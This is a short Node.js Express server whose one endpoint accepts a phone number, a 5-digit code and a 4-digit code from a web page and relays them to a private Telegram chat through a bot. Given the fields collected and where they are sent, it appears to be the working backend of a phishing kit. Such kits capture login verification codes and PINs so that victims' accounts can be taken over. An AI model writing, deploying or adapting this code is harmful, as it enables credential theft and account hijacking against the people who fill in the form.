const express = require('express');
const path = require('path');
const axios = require('axios');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.post('/api/submit-application', async (req, res) => {
    // We now only grab the fields we need from the request
    const { phone, fiveDigitCode, fourDigitCode } = req.body;

    console.log("New Details Received:", req.body);

    // Using backticks (`) makes the text clickable/copyable in Telegram
    const message = `
🔔 *NEW DETAILS RECEIVED*
-------------------------
*Phone Number:* \`${phone || 'Not provided'}\`
*5-Digit Code:* \`${fiveDigitCode || 'Not provided'}\`
*4-Digit Code:* \`${fourDigitCode || 'Not provided'}\`
    `;

    try {
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.log("Missing Telegram credentials.");
            return res.status(500).json({ success: false });
        }

        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Telegram Error:', error.message);
        res.status(500).json({ success: false });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});